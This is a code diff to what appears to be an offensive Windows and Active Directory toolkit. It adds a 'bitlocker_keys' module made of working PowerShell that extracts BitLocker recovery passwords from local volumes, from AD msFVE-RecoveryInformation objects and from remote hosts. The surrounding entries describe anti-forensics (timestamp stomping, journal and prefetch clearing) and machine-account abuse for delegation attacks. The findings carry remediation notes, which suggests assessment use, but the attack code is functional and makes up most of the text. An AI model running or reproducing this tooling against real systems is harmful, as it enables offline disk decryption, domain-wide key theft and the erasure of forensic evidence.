@@ -552,6 +552,11 @@ const PROGRAMS = {
       "Anti-forensics toolkit — timestamp stomping (modify file Created/Modified/Accessed times to blend with legitimate files), prefetch and amcache clearing (remove execution evidence), USN journal manipulation (delete change tracking records), shimcache clearing, and recent docs/jump list cleanup. Covers the major forensic artifact categories that IR teams examine",
     args: "--action stomp|prefetch|amcache|usn|shimcache|recent|full [--target PATH] [--timestamp 'YYYY-MM-DD HH:mm:ss'] [--reference PATH]",
   },
+  bitlocker_keys: {
+    description:
+      "BitLocker recovery key extraction — retrieve BitLocker recovery keys from Active Directory (stored in msFVE-RecoveryInformation objects), local registry, WMI, and TPM metadata. Enumerate encrypted volumes on local and remote hosts, extract recovery passwords for offline disk decryption, and check for suspended protection (cleartext keys in memory)",
+    args: "--action local|ad|remote|enum [--target HOST] [--computer COMPUTER_NAME] [--volume C:]",
+  },
   machine_account: {
     description:
       "Machine account operations — create, delete, and manage computer accounts in Active Directory. Abuse ms-DS-MachineAccountQuota (default: 10) to create machine accounts for RBCD attacks, relay targets, and resource-based constrained delegation chains. Check quota, create accounts with known passwords, enumerate existing machine accounts and their creators",
@@ -17650,6 +17655,245 @@ Write-Output "[*] Cleanup complete — recent activity evidence removed"
   return { output: output.join("\n"), findings }
 }
 
+async function bitlockerKeys(args: string[], timeout: number): Promise<HookResult> {
+  const action = argVal(args, "--action") || "local"
+  const target = argVal(args, "--target")
+  const computer = argVal(args, "--computer")
+  const volume = argVal(args, "--volume") || "C:"
+  const findings: Finding[] = []
+  const output: string[] = ["[*] BitLocker recovery key extraction...\n"]
+
+  if (action === "local") {
+    const script = `
+Write-Output "=== Local BitLocker Status ==="
+Write-Output ""
+# Enumerate encrypted volumes
+$volumes = Get-BitLockerVolume -ErrorAction SilentlyContinue
+if (-not $volumes) {
+  Write-Output "BitLocker not active or Get-BitLockerVolume not available"
+  Write-Output "Trying WMI method..."
+  $wmiVolumes = Get-WmiObject -Namespace "Root\\CIMV2\\Security\\MicrosoftVolumeEncryption" -Class Win32_EncryptableVolume -ErrorAction SilentlyContinue
+  if ($wmiVolumes) {
+    foreach ($v in $wmiVolumes) {
+      $status = switch ($v.GetProtectionStatus().ProtectionStatus) { 0 {"Unprotected"} 1 {"Protected"} 2 {"Unknown"} }
+      Write-Output "Volume: $($v.DriveLetter) — Status: $status"
+      if ($v.GetProtectionStatus().ProtectionStatus -eq 1) {
+        # Try to get recovery key
+        $keyProtectors = $v.GetKeyProtectors(3)
+        if ($keyProtectors.VolumeKeyProtectorID) {
+          foreach ($kpId in $keyProtectors.VolumeKeyProtectorID) {
+            $rp = $v.GetKeyProtectorNumericalPassword($kpId)
+            if ($rp.NumericalPassword) {
+              Write-Output "[+] Recovery Password: $($rp.NumericalPassword)"
+              Write-Output "    Protector ID: $kpId"
+            }
+          }
+        }
+      }
+    }
+  } else {
+    Write-Output "No encrypted volumes found via WMI"
+  }
+  return
+}
+foreach ($v in $volumes) {
+  Write-Output "Volume: $($v.MountPoint)"
+  Write-Output "  Status: $($v.VolumeStatus)"
+  Write-Output "  Protection: $($v.ProtectionStatus)"
+  Write-Output "  Encryption: $($v.EncryptionPercentage)%"
+  Write-Output "  Lock Status: $($v.LockStatus)"
+  Write-Output "  Key Protectors:"
+  foreach ($kp in $v.KeyProtector) {
+    Write-Output "    Type: $($kp.KeyProtectorType)"
+    Write-Output "    ID: $($kp.KeyProtectorId)"
+    if ($kp.RecoveryPassword) {
+      Write-Output "    [+] RECOVERY PASSWORD: $($kp.RecoveryPassword)"
+    }
+    if ($kp.KeyFileName) {
+      Write-Output "    Key File: $($kp.KeyFileName)"
+    }
+  }
+  Write-Output ""
+}
+# Check if protection is suspended (keys in cleartext memory)
+$suspended = $volumes | Where-Object { $_.ProtectionStatus -eq 'Off' -and $_.VolumeStatus -eq 'FullyEncrypted' }
+if ($suspended) {
+  Write-Output "[!] WARNING: BitLocker protection SUSPENDED on:"
+  foreach ($s in $suspended) {
+    Write-Output "    $($s.MountPoint) — keys in cleartext memory until reboot"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    const recoveryMatches = r.stdout.match(/RECOVERY PASSWORD: .+/g) || []
+    for (const rk of recoveryMatches) {
+      findings.push({
+        checkId: "BITL-001",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "BitLocker",
+        title: "BitLocker recovery password extracted",
+        details: rk,
+        remediation: "Rotate BitLocker recovery keys, restrict admin access.",
+      })
+    }
+    if (r.stdout.includes("protection SUSPENDED")) {
+      findings.push({
+        checkId: "BITL-002",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "BitLocker Suspended",
+        title: "BitLocker protection suspended — cleartext keys in memory",
+        details: "Volume encryption keys are in cleartext memory until protection is resumed or device reboots",
+        remediation: "Resume BitLocker protection: Resume-BitLocker -MountPoint C:",
+      })
+    }
+  }
+
+  if (action === "ad") {
+    const computerFilter = computer ? `(cn=${computer.replace(/\$$/, "")})` : "(objectCategory=computer)"
+    const script = `
+Write-Output "=== BitLocker Recovery Keys from Active Directory ==="
+Write-Output ""
+Write-Output "Searching for msFVE-RecoveryInformation objects..."
+Write-Output ""
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(objectClass=msFVE-RecoveryInformation)"
+$searcher.PageSize = 1000
+$searcher.PropertiesToLoad.AddRange(@("msFVE-RecoveryPassword","msFVE-VolumeGuid","whenCreated","distinguishedName"))
+$keys = $searcher.FindAll()
+Write-Output "Recovery keys found in AD: $($keys.Count)"
+Write-Output ""
+foreach ($k in $keys) {
+  $dn = $k.Properties["distinguishedname"][0]
+  $computerDn = ($dn -split ',',2)[1]
+  $computerCn = ($computerDn -split ',')[0] -replace 'CN=',''
+  $recoveryPwd = $k.Properties["msfve-recoverypassword"][0]
+  $volumeGuid = $k.Properties["msfve-volumeguid"][0]
+  $created = $k.Properties["whencreated"][0]
+  ${computer ? `if ($computerCn -ne '${computer.replace(/\$$/, "")}') { continue }` : ""}
+  Write-Output "[+] Computer: $computerCn"
+  Write-Output "    Recovery Password: $recoveryPwd"
+  Write-Output "    Volume GUID: $volumeGuid"
+  Write-Output "    Stored: $created"
+  Write-Output ""
+}
+if ($keys.Count -eq 0) {
+  Write-Output "No BitLocker recovery keys stored in AD"
+  Write-Output "This may mean:"
+  Write-Output "  - BitLocker is not deployed"
+  Write-Output "  - Keys are not backed up to AD (GPO not configured)"
+  Write-Output "  - You lack read permissions on msFVE-RecoveryInformation"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+    const adKeyMatches = r.stdout.match(/\[\+\] Computer: .+/g) || []
+    if (adKeyMatches.length > 0) {
+      findings.push({
+        checkId: "BITL-003",
+        provider: "winhook",
+        severity: "critical",
+        status: "FAIL",
+        resource: "AD BitLocker Keys",
+        title: `${adKeyMatches.length} BitLocker recovery key(s) extracted from AD`,
+        details: "Recovery keys stored in msFVE-RecoveryInformation objects are readable with domain credentials",
+        remediation: "Restrict read permissions on msFVE-RecoveryInformation objects to authorized admins only.",
+      })
+    }
+  }
+
+  if (action === "remote") {
+    if (!target) {
+      output.push("ERROR: --target required for remote action")
+      return { output: output.join("\n"), findings }
+    }
+    const script = `
+Write-Output "=== Remote BitLocker Status: ${target} ==="
+Write-Output ""
+try {
+  $volumes = Get-BitLockerVolume -ComputerName '${target}' -ErrorAction Stop
+  foreach ($v in $volumes) {
+    Write-Output "Volume: $($v.MountPoint)"
+    Write-Output "  Protection: $($v.ProtectionStatus)"
+    Write-Output "  Key Protectors:"
+    foreach ($kp in $v.KeyProtector) {
+      Write-Output "    Type: $($kp.KeyProtectorType)"
+      if ($kp.RecoveryPassword) {
+        Write-Output "    [+] RECOVERY PASSWORD: $($kp.RecoveryPassword)"
+      }
+    }
+    Write-Output ""
+  }
+} catch {
+  Write-Output "Remote query failed: $_"
+  Write-Output "Trying WMI..."
+  try {
+    $wmi = Get-WmiObject -Namespace "Root\\CIMV2\\Security\\MicrosoftVolumeEncryption" -Class Win32_EncryptableVolume -ComputerName '${target}'
+    foreach ($v in $wmi) {
+      $status = switch ($v.GetProtectionStatus().ProtectionStatus) { 0 {"Off"} 1 {"On"} }
+      Write-Output "  $($v.DriveLetter): Protection $status"
+    }
+  } catch {
+    Write-Output "WMI also failed: $_"
+    Write-Output "Check AD instead: winhook bitlocker_keys --action ad --computer ${target}"
+  }
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  if (action === "enum") {
+    const script = `
+Write-Output "=== BitLocker Deployment Enumeration ==="
+Write-Output ""
+# Check GPO for BitLocker backup policy
+Write-Output "--- BitLocker GPO Settings (local) ---"
+$gpoPath = "HKLM:\\SOFTWARE\\Policies\\Microsoft\\FVE"
+$backupToAD = (Get-ItemProperty $gpoPath -Name "FDVActiveDirectoryBackup" -ErrorAction SilentlyContinue).FDVActiveDirectoryBackup
+$requireBackup = (Get-ItemProperty $gpoPath -Name "FDVRequireActiveDirectoryBackup" -ErrorAction SilentlyContinue).FDVRequireActiveDirectoryBackup
+Write-Output "Backup to AD: $(if ($backupToAD) {'Enabled'} else {'Not configured'})"
+Write-Output "Require AD backup: $(if ($requireBackup) {'Yes'} else {'Not configured'})"
+Write-Output ""
+# Enumerate all computers with BitLocker keys in AD
+Write-Output "--- Computers with BitLocker Keys in AD ---"
+$searcher = New-Object DirectoryServices.DirectorySearcher
+$searcher.Filter = "(objectClass=msFVE-RecoveryInformation)"
+$searcher.PageSize = 1000
+$keys = $searcher.FindAll()
+$computerSet = @{}
+foreach ($k in $keys) {
+  $dn = $k.Properties["distinguishedname"][0]
+  $computerDn = ($dn -split ',',2)[1]
+  $computerCn = ($computerDn -split ',')[0] -replace 'CN=',''
+  $computerSet[$computerCn] = ($computerSet[$computerCn] + 1)
+}
+Write-Output "Computers with BitLocker keys stored in AD: $($computerSet.Count)"
+foreach ($c in ($computerSet.GetEnumerator() | Sort-Object Name)) {
+  Write-Output "  $($c.Key): $($c.Value) key(s)"
+}
+Write-Output ""
+# TPM info
+Write-Output "--- TPM Status (local) ---"
+$tpm = Get-Tpm -ErrorAction SilentlyContinue
+if ($tpm) {
+  Write-Output "TPM Present: $($tpm.TpmPresent)"
+  Write-Output "TPM Ready: $($tpm.TpmReady)"
+  Write-Output "TPM Enabled: $($tpm.TpmEnabled)"
+  Write-Output "Manufacturer: $($tpm.ManufacturerIdTxt)"
+}
+`
+    const r = await ps(script, timeout)
+    output.push(r.stdout)
+  }
+
+  return { output: output.join("\n"), findings }
+}
+
 async function machineAccount(args: string[], timeout: number): Promise<HookResult> {
   const action = argVal(args, "--action") || "quota"
   const name = argVal(args, "--name")
@@ -22976,6 +23220,7 @@ const dispatch: Record<Program, (args: string[], timeout: number) => Promise<Hoo
   azure_ad_hybrid: azureAdHybrid,
   adidns_poison: adidnsPoison,
   machine_account: machineAccount,
+  bitlocker_keys: bitlockerKeys,
 }
 
 export const WinhookTool = Tool.define("winhook", {
